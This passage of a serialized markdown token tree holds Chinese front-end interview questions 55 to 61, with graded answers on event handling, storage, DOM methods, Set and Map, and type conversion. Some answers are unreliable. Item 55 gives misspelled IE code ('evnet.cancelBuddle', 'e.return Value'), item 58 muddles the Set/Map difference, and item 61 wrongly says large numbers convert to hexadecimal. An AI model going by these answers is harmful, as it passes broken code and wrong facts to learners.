localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。\\n\\n","task":false,"loose":true,"text":"cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。\\n","tokens":[{"type":"text","raw":"cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。\\n","text":"cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。","tokens":[{"type":"text","raw":"cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。","text":"cookie：存储在客户端，大小限制为4KB，有有效期，可以设置过期时间，默认为会话级别，即浏览器关闭后cookie失效。","escaped":false}]}]},{"type":"list_item","raw":"- localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。\\n\\n","task":false,"loose":true,"text":"localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。\\n","tokens":[{"type":"text","raw":"localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。\\n","text":"localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。","tokens":[{"type":"text","raw":"localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。","text":"localStorage：存储在客户端，大小限制为5MB，没有有效期，除非手动清除，否则一直存在。","escaped":false}]}]},{"type":"list_item","raw":"- sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。\\n\\n","task":false,"loose":true,"text":"sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。\\n","tokens":[{"type":"text","raw":"sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。\\n","text":"sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。","tokens":[{"type":"text","raw":"sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。","text":"sessionStorage：存储在客户端，大小限制为5MB，仅在当前会话有效，关闭浏览器后失效。","escaped":false}]}]},{"type":"list_item","raw":"- localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","task":false,"loose":true,"text":"localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","tokens":[{"type":"text","raw":"localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","text":"localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","tokens":[{"type":"text","raw":"localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","text":"localStorage和sessionStorage的区别在于，localStorage的数据在浏览器关闭后依然存在，而sessionStorage的数据在浏览器关闭后就会失效。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 55. 如何阻止事件冒泡，事件的默认行为？\\n\\n","depth":2,"text":"55. 如何阻止事件冒泡，事件的默认行为？","tokens":[{"type":"text","raw":"55. 如何阻止事件冒泡，事件的默认行为？","text":"55. 如何阻止事件冒泡，事件的默认行为？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 阻止事件冒泡：\\n\\n- event.stopPropagation();\\n\\n- IE：evnet.cancelBuddle = true;\\n\\n- 阻止事件默认行为：\\n\\n- event.preventDefault();\\n\\n- IE： e.return Value = false;","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 阻止事件冒泡：\\n\\n","task":false,"loose":true,"text":"阻止事件冒泡：\\n","tokens":[{"type":"text","raw":"阻止事件冒泡：\\n","text":"阻止事件冒泡：","tokens":[{"type":"text","raw":"阻止事件冒泡：","text":"阻止事件冒泡：","escaped":false}]}]},{"type":"list_item","raw":"- event.stopPropagation();\\n\\n","task":false,"loose":true,"text":"event.stopPropagation();\\n","tokens":[{"type":"text","raw":"event.stopPropagation();\\n","text":"event.stopPropagation();","tokens":[{"type":"text","raw":"event.stopPropagation();","text":"event.stopPropagation();","escaped":false}]}]},{"type":"list_item","raw":"- IE：evnet.cancelBuddle = true;\\n\\n","task":false,"loose":true,"text":"IE：evnet.cancelBuddle = true;\\n","tokens":[{"type":"text","raw":"IE：evnet.cancelBuddle = true;\\n","text":"IE：evnet.cancelBuddle = true;","tokens":[{"type":"text","raw":"IE：evnet.cancelBuddle = true;","text":"IE：evnet.cancelBuddle = true;","escaped":false}]}]},{"type":"list_item","raw":"- 阻止事件默认行为：\\n\\n","task":false,"loose":true,"text":"阻止事件默认行为：\\n","tokens":[{"type":"text","raw":"阻止事件默认行为：\\n","text":"阻止事件默认行为：","tokens":[{"type":"text","raw":"阻止事件默认行为：","text":"阻止事件默认行为：","escaped":false}]}]},{"type":"list_item","raw":"- event.preventDefault();\\n\\n","task":false,"loose":true,"text":"event.preventDefault();\\n","tokens":[{"type":"text","raw":"event.preventDefault();\\n","text":"event.preventDefault();","tokens":[{"type":"text","raw":"event.preventDefault();","text":"event.preventDefault();","escaped":false}]}]},{"type":"list_item","raw":"- IE： e.return Value = false;","task":false,"loose":true,"text":"IE： e.return Value = false;","tokens":[{"type":"text","raw":"IE： e.return Value = false;","text":"IE： e.return Value = false;","tokens":[{"type":"text","raw":"IE： e.return Value = false;","text":"IE： e.return Value = false;","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 56. document.write() 和 innerHTML 的区别？\\n\\n","depth":2,"text":"56. document.write() 和 innerHTML 的区别？","tokens":[{"type":"text","raw":"56. document.write() 和 innerHTML 的区别？","text":"56. document.write() 和 innerHTML 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；\\n\\n- innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；\\n\\n- innerHTML将内容写入到某个DOM节点，不会导致页面重绘；\\n\\n- innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；\\n\\n","task":false,"loose":true,"text":"document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；\\n","tokens":[{"type":"text","raw":"document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；\\n","text":"document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；","tokens":[{"type":"text","raw":"document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；","text":"document.write()是直接写入到页面的内容流，如果在写之前没有调用document.open()，浏览器会自动调用open()，每次写完关闭之后会重新调用该函数，会导致页面被重写；","escaped":false}]}]},{"type":"list_item","raw":"- innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；\\n\\n","task":false,"loose":true,"text":"innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；\\n","tokens":[{"type":"text","raw":"innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；\\n","text":"innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；","tokens":[{"type":"text","raw":"innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；","text":"innerHTML则是 DOM 页面元素的一个属性，代表该元素的html内容；","escaped":false}]}]},{"type":"list_item","raw":"- innerHTML将内容写入到某个DOM节点，不会导致页面重绘；\\n\\n","task":false,"loose":true,"text":"innerHTML将内容写入到某个DOM节点，不会导致页面重绘；\\n","tokens":[{"type":"text","raw":"innerHTML将内容写入到某个DOM节点，不会导致页面重绘；\\n","text":"innerHTML将内容写入到某个DOM节点，不会导致页面重绘；","tokens":[{"type":"text","raw":"innerHTML将内容写入到某个DOM节点，不会导致页面重绘；","text":"innerHTML将内容写入到某个DOM节点，不会导致页面重绘；","escaped":false}]}]},{"type":"list_item","raw":"- innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","task":false,"loose":true,"text":"innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","tokens":[{"type":"text","raw":"innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","text":"innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","tokens":[{"type":"text","raw":"innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","text":"innerHTML在很多情况下都优于document.write()，原因在于其允许更精确的控制要刷新页面的那个部分","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 57. window load和document ready的区别？\\n\\n","depth":2,"text":"57. window load和document ready的区别？","tokens":[{"type":"text","raw":"57. window load和document ready的区别？","text":"57. window load和document ready的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。\\n\\n- document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。\\n\\n- window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。\\n\\n- 因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。\\n\\n","task":false,"loose":true,"text":"window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。\\n","tokens":[{"type":"text","raw":"window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。\\n","text":"window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。","tokens":[{"type":"text","raw":"window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。","text":"window load：当整个页面及所有依赖资源如样式表和图片都已完成加载时，触发window load事件。","escaped":false}]}]},{"type":"list_item","raw":"- document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。\\n\\n","task":false,"loose":true,"text":"document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。\\n","tokens":[{"type":"text","raw":"document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。\\n","text":"document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。","tokens":[{"type":"text","raw":"document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。","text":"document ready：当初始的 HTML 文档被完全加载和解析完成之后，DOMContentLoaded 事件被触发，无需等待样式表、图像和子框架的加载完成。","escaped":false}]}]},{"type":"list_item","raw":"- window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。\\n\\n","task":false,"loose":true,"text":"window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。\\n","tokens":[{"type":"text","raw":"window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。\\n","text":"window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。","tokens":[{"type":"text","raw":"window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。","text":"window load事件是在页面加载完成后触发的，而document ready事件是在DOM加载完成后触发的，因此，document ready事件比window load事件更早触发。","escaped":false}]}]},{"type":"list_item","raw":"- 因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","task":false,"loose":true,"text":"因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","tokens":[{"type":"text","raw":"因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","text":"因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","tokens":[{"type":"text","raw":"因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","text":"因此，如果需要在页面加载完成后执行某些操作，可以使用window load事件；如果需要在DOM加载完成后执行某些操作，可以使用document ready事件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 58. Set、Map的区别？\\n\\n","depth":2,"text":"58. Set、Map的区别？","tokens":[{"type":"text","raw":"58. Set、Map的区别？","text":"58. Set、Map的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。\\n\\n- Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。\\n\\n- Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。\\n\\n","task":false,"loose":true,"text":"Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。\\n","tokens":[{"type":"text","raw":"Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。\\n","text":"Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。","tokens":[{"type":"text","raw":"Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。","text":"Set：是一种新的数据结构，类似于数组，但是成员的值都是唯一的，没有重复的值。","escaped":false}]}]},{"type":"list_item","raw":"- Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。\\n\\n","task":false,"loose":true,"text":"Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。\\n","tokens":[{"type":"text","raw":"Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。\\n","text":"Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。","tokens":[{"type":"text","raw":"Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。","text":"Map：是一种新的数据结构，类似于对象，但是键可以是任意类型。","escaped":false}]}]},{"type":"list_item","raw":"- Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","task":false,"loose":true,"text":"Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","tokens":[{"type":"text","raw":"Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","text":"Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","tokens":[{"type":"text","raw":"Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","text":"Set和Map的区别在于，Set的键值是唯一的，而Map的键值可以是任意类型。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 59. return，break，continue的区别是什么\\n\\n","depth":2,"text":"59. return，break，continue的区别是什么","tokens":[{"type":"text","raw":"59. return，break，continue的区别是什么","text":"59. return，break，continue的区别是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用\\n\\n- break 跳出循环，剩余的循环不再执行\\n\\n- continue  跳出本次循环，剩余的循环继续执行","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用\\n\\n","task":false,"loose":true,"text":"return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用\\n","tokens":[{"type":"text","raw":"return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用\\n","text":"return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用","tokens":[{"type":"text","raw":"return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用","text":"return 必须写在函数内部，遇到return后函数内部剩余的代码不再执行，直接返回；还可以使用return返回一个值给外面使用","escaped":false}]}]},{"type":"list_item","raw":"- break 跳出循环，剩余的循环不再执行\\n\\n","task":false,"loose":true,"text":"break 跳出循环，剩余的循环不再执行\\n","tokens":[{"type":"text","raw":"break 跳出循环，剩余的循环不再执行\\n","text":"break 跳出循环，剩余的循环不再执行","tokens":[{"type":"text","raw":"break 跳出循环，剩余的循环不再执行","text":"break 跳出循环，剩余的循环不再执行","escaped":false}]}]},{"type":"list_item","raw":"- continue  跳出本次循环，剩余的循环继续执行","task":false,"loose":true,"text":"continue  跳出本次循环，剩余的循环继续执行","tokens":[{"type":"text","raw":"continue  跳出本次循环，剩余的循环继续执行","text":"continue  跳出本次循环，剩余的循环继续执行","tokens":[{"type":"text","raw":"continue  跳出本次循环，剩余的循环继续执行","text":"continue  跳出本次循环，剩余的循环继续执行","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 60. typeof NaN 的结果是什么？\\n\\n","depth":2,"text":"60. typeof NaN 的结果是什么？","tokens":[{"type":"text","raw":"60. typeof NaN 的结果是什么？","text":"60. typeof NaN 的结果是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","task":false,"loose":false,"text":"NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","tokens":[{"type":"text","raw":"NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","text":"NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","tokens":[{"type":"text","raw":"NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","text":"NaN 指“不是一个数字”（not a number），NaN 是一个“警戒值”（sentinel value，有特殊用途的常规值），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\ntypeof NaN; // \\"number\\"\\n\\n```","lang":"js","text":"\\ntypeof NaN; // \\"number\\"\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 61. 其他值到字符串的转换规则？\\n\\n","depth":2,"text":"61. 其他值到字符串的转换规则？","tokens":[{"type":"text","raw":"61. 其他值到字符串的转换规则？","text":"61. 其他值到字符串的转换规则？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 \\"undefined\\"，\\n\\n- Boolean 类型，true 转换为 \\"true\\"，false 转换为 \\"false\\"。\\n\\n- Number 类型的值直接转换，不过那些超出字符表示范围的整数部分，则用十六进制表示。\\n\\n- Symbol 类型的值直接转换，但是只允许显式转换，如 String(sym)。\\n\\n- 对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]] 的值，如\\"[object Object]\\"。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 \\"undefined\\"，\\n\\n","task":false,"loose":true,"text":"Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 \\"undefined\\"，\\n","tokens":[{"type":"text","raw":"Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 \\"undefined\\"，\\n","text":"Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 \\"undefined\\"，","tokens":[{"type":"text","raw":"Null 和 Undefined 类型 ，null 转换为 \\"null\\"，undefined 转换为 